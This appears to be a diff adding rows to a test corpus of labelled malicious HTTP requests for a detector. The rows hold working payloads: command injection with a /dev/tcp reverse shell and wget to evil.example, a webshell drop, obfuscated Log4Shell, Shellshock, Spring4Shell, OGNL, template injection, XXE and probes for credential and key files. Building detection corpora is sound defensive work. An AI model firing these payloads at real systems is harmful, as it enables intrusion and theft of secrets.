+cmdi-18	cmdi	GET	/x?c=powershell+-enc+JABjAGwAaQBlAG4AdAA=	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				encoded powershell
+cmdi-19	cmdi	POST	/x	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0	application/x-www-form-urlencoded		c=powershell+-NoProfile+-Command+Get-Process	powershell in form body
+cmdi-20	cmdi	GET	/x?host=1.1.1.1+%26%26+dir	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				windows dir
+cmdi-21	cmdi	GET	/x?h=;cat${IFS}/var/log/syslog	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				IFS space substitution
+cmdi-22	cmdi	GET	/x?host=|nslookup+evil.example	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				pipe nslookup
+cmdi-23	cmdi	GET	/x?host=1;sleep+10	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				semicolon sleep
+cmdi-24	cmdi	GET	/x?host=1;ping+-c+10+127.0.0.1	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				semicolon ping
+cmdi-25	cmdi	GET	/x?host=1;WhoAmI	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				mixed-case whoami
+cmdi-26	cmdi	GET	/x?host=1;echo+PD9waHA+|base64+-d>shell.php	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				webshell drop via echo and base64
+cmdi-27	cmdi	POST	/x	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0	application/x-www-form-urlencoded		cmd=exec+5%3C%26%3E%2Fdev%2Ftcp%2F10.0.0.1%2F4444	/dev/tcp in form body
+cmdi-28	cmdi	POST	/x	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0	application/x-www-form-urlencoded		h=1%7Cwget+http%3A%2F%2Fevil.example%2Fx	pipe wget in form body
+cmdi-29	cmdi	GET	/x?host=1`wget+http://evil.example/x`	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				backtick wget
+cmdi-30	cmdi	GET	/x?host=1;uname+-a	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				semicolon uname -a
+# ---- High-impact exploit strings ----
+expl-01	exploit	GET	/home	${jndi:ldap://evil.example/a}				Log4Shell in User-Agent
+expl-02	exploit	GET	/home	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0		X-Api-Version: ${jndi:ldap://evil.example/a}		Log4Shell in a custom header
+expl-03	exploit	GET	/?x=${jndi:ldap://evil.example/a}	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				Log4Shell in URI
+expl-04	exploit	GET	/?x=%24%7Bjndi%3Aldap%3A%2F%2Fevil.example%2Fa%7D	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				encoded Log4Shell in URI
+expl-05	exploit	GET	/?x=%2524%257Bjndi%253Aldap%253A%252F%252Fevil.example%252Fa%257D	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				double-encoded Log4Shell in URI
+expl-06	exploit	GET	/home	${${lower:j}ndi:${lower:l}dap://evil.example/a}				Log4Shell lower-lookup obfuscation
+expl-07	exploit	GET	/home	${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://evil.example/a}				Log4Shell default-value obfuscation
+expl-08	exploit	GET	/home	${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap://evil.example/a}				Log4Shell env obfuscation
+expl-09	exploit	POST	/api/log	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0	application/json		{"name":"${jndi:rmi://evil.example/a}"}	Log4Shell in JSON body
+expl-10	exploit	POST	/login	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0	application/x-www-form-urlencoded		username=%24%7Bjndi%3Aldap%3A%2F%2Fevil.example%2Fa%7D&password=x	Log4Shell in form body
+expl-11	exploit	GET	/home	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0		Cookie: session=${jndi:ldap://evil.example/a}		Log4Shell in cookie
+expl-12	exploit	GET	/home	${JnDi:LDAP://evil.example/a}				mixed-case Log4Shell
+expl-13	exploit	GET	/home	${${upper:j}${upper:n}di:ldap://evil.example/a}				Log4Shell upper-lookup obfuscation
+expl-14	exploit	GET	/home	${j${::-n}di:ldap://evil.example/a}				Log4Shell partial obfuscation
+expl-15	exploit	GET	/home	${${lower:${lower:jndi}}:ldap://evil.example/a}				Log4Shell doubly nested lower
+expl-16	exploit	GET	/?x=${${::-j}ndi:ldap://evil.example/a}	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				Log4Shell obfuscation in URI
+expl-17	exploit	POST	/api/log	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0	application/json		{"name":"${${lower:j}ndi:ldap://evil.example/a}"}	Log4Shell obfuscation in JSON body
+expl-18	exploit	GET	/cgi-bin/status	() { :; }; /bin/bash -c 'cat /etc/passwd'				Shellshock in User-Agent
+expl-19	exploit	GET	/cgi-bin/status	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0		Referer: () { ignored; }; echo Content-Type: text/plain; echo; /usr/bin/id		Shellshock in Referer
+expl-20	exploit	GET	/cgi-bin/status	(){ :;}; /usr/bin/id				Shellshock without spaces
+expl-21	exploit	GET	/cgi-bin/status	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0		Cookie: x=() { :; }; /usr/bin/id		Shellshock in cookie
+expl-22	exploit	POST	/user	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0	application/x-www-form-urlencoded		class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di	Spring4Shell in form body
+expl-23	exploit	GET	/user?class.module.classLoader.URLs%5B0%5D=0	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				Spring4Shell in URI
+expl-24	exploit	POST	/functionRouter	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0	text/plain	spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("id")	x	Spring Cloud Function routing header
+expl-25	exploit	GET	/index.php?page=php://filter/convert.base64-encode/resource=index.php	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				php filter wrapper
+expl-26	exploit	POST	/index.php?page=php://input	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0	text/plain		<?php system('id');?>	php input wrapper
+expl-27	exploit	POST	/index.php	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0	application/x-www-form-urlencoded		page=php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dconfig.php	php filter wrapper in form body
+expl-28	exploit	POST	/upload.action	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0	%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):null)}		x	Struts OGNL in Content-Type
+expl-29	exploit	GET	/search?q={{''.__class__.__mro__[1].__subclasses__()}}	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				Jinja template injection in URI
+expl-30	exploit	POST	/greet	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0	application/json		{"name":"{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"}	Jinja template injection in JSON body
+expl-31	exploit	POST	/xml	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0	application/xml		<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>	XXE reading passwd
+expl-32	exploit	POST	/xml	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0	application/xml		<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.example/x.dtd"> %xxe;]><foo/>	XXE parameter entity
+expl-33	exploit	GET	/struts/index.action?debug=command&expression=(#_memberAccess["allowStaticMethodAccess"]=true)	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				OGNL member access in URI
+# ---- Protocol evasion ----
+evas-01	evasion	GET	/redirect?url=%0d%0aSet-Cookie:%20admin=true	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				CRLF cookie injection
+evas-02	evasion	GET	/redirect?url=http://x.example/%0d%0aLocation:%20http://evil.example	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				CRLF location injection
+evas-03	evasion	GET	/download?file=..%c0%af..%c0%af..%c0%afwindows/win.ini	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				overlong slash to win.ini
+evas-04	evasion	GET	/item?id=1%2527--	Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:Port Check)				double-encoded quote-comment with scanner
+evas-05	evasion	GET	/download?file=x.php%00.jpg&p=../../../etc/passwd	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				null byte before extension plus traversal
+evas-06	evasion	GET	/download?f=..%2f%00	sqlmap/1.7.2#stable (https://sqlmap.org)				null byte plus single traversal plus scanner
+evas-07	evasion	GET	/download?f=..%25%32%66..%25%32%66etc%25%32%66passwd	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				double-encoded slash written with hex digits
+evas-08	evasion	GET	/item?id=1%27%2F%2A	nuclei - open-source project (github.com/projectdiscovery/nuclei)				quote then block comment with scanner
+# ---- Scanner and attack-tool user-agents (each paired with one weak signal) ----
+scan-01	scanner	GET	/item?id=1'--	sqlmap/1.7.2#stable (https://sqlmap.org)				sqlmap plus quote-comment
+scan-02	scanner	GET	/item?id=1'--	Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:Port Check)				Nikto plus quote-comment
+scan-03	scanner	GET	/item?id=1'--	Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)				Nmap plus quote-comment
+scan-04	scanner	GET	/item?id=1'--	masscan/1.3 (https://github.com/robertdavidgraham/masscan)				masscan plus quote-comment
+scan-05	scanner	GET	/item?id=1'--	Nuclei - Open-source project (github.com/projectdiscovery/nuclei)				Nuclei plus quote-comment
+scan-06	scanner	GET	/item?id=1'--	WPScan v3.8.25 (https://wpscan.com/wordpress-security-scanner)				WPScan plus quote-comment
+scan-07	scanner	GET	/item?id=1'--	DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)				DirBuster plus quote-comment
+scan-08	scanner	GET	/download?f=../x	gobuster/3.6				Gobuster plus single traversal
+scan-09	scanner	GET	/item?id=1'--	Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; Acunetix Web Vulnerability Scanner - Free Edition)				Acunetix plus quote-comment
+scan-10	scanner	GET	/item?id=1'--	Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; Nessus SOAP)				Nessus plus quote-comment
+scan-11	scanner	GET	/download?f=../x	Wfuzz/3.1.0				Wfuzz plus single traversal
+scan-12	scanner	GET	/item?id=1'--	Mozilla/5.0 zgrab/0.x				ZGrab plus quote-comment
+scan-13	scanner	GET	/download?f=../x	feroxbuster/2.10.0				feroxbuster plus single traversal
+scan-14	scanner	GET	/item?id=1'--	Mozilla/5.0 [en] (X11, U; OpenVAS-VT 22.4)				OpenVAS plus quote-comment
+scan-15	scanner	GET	/item?id=1%27+%23	sqlmap/1.7.2#stable (https://sqlmap.org)				sqlmap plus quote hash comment
+scan-16	scanner	POST	/login	sqlmap/1.7.2#stable (https://sqlmap.org)	application/x-www-form-urlencoded		username=admin%27--+&password=x	sqlmap plus quote-comment in body
+scan-17	scanner	GET	/home	sqlmap/1.7.2#stable (https://sqlmap.org)		Cookie: id=1%27--		sqlmap plus quote-comment in cookie
+scan-18	scanner	GET	/phpinfo.php	gobuster/3.6				Gobuster plus phpinfo probe
+scan-19	scanner	GET	/.DS_Store	gobuster/3.6				Gobuster plus .DS_Store probe
+scan-20	scanner	GET	/backup/db.sql	feroxbuster/2.10.0				feroxbuster plus SQL dump probe
+scan-21	scanner	GET	/.htaccess	Nikto/2.1.6				Nikto plus .htaccess probe
+# ---- Probes for sensitive files ----
+probe-01	probe	GET	/.env	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				.env
+probe-02	probe	GET	/.env.production	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				.env.production
+probe-03	probe	GET	/app/.env.bak	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				.env.bak in a subdirectory
+probe-04	probe	GET	/.git/config	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				.git/config
+probe-05	probe	GET	/.git/HEAD	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				.git/HEAD
+probe-06	probe	GET	/.svn/entries	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				.svn/entries
+probe-07	probe	GET	/.hg/store/data	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				mercurial store
+probe-08	probe	GET	/wp-config.php.bak	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				wp-config backup
+probe-09	probe	GET	/wp-config.php~	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				wp-config editor backup
+probe-10	probe	GET	/.aws/credentials	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				AWS credentials
+probe-11	probe	GET	/.ssh/id_rsa	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				SSH private key in .ssh
+probe-12	probe	GET	/backup/id_rsa	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				SSH private key elsewhere
+probe-13	probe	GET	/actuator/env	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				actuator env
+probe-14	probe	GET	/actuator/heapdump	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				actuator heapdump
+probe-15	probe	GET	/.htpasswd	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				.htpasswd
+probe-16	probe	GET	/.docker/config.json	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				docker config
+probe-17	probe	GET	/.npmrc	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				.npmrc
+probe-18	probe	GET	/.bash_history	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				shell history
+probe-19	probe	GET	/%2eenv	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				encoded dot in .env
+probe-20	probe	GET	/%252eenv	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				double-encoded dot in .env
+probe-21	probe	GET	/.ENV	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				upper-case .ENV
+probe-22	probe	GET	/.git/	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				.git directory listing
+probe-23	probe	GET	/wp-config.php	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				wp-config plain
+probe-24	probe	GET	/.kube/config	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				kube config
+probe-25	probe	GET	/actuator/jolokia	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				actuator jolokia
+evas-09	evasion	GET	/download?file=..%c1%1c..%c1%1cwindows/win.ini	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				overlong C1 separator to win.ini
+xss-36	xss	POST	/comment	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0	application/x-www-form-urlencoded		comment=javascript%3Aalert(1)	javascript uri in form body
+xss-37	xss	GET	/search?q=%26lt%3Bscript%26gt%3Balert(1)	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				entity-escaped script tag with alert in URI
+expl-34	exploit	GET	/cgi-bin/status?x=%28%29%20%7B%20%3A%3B%20%7D%3B%20%2Fbin%2Fid	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				Shellshock in URI
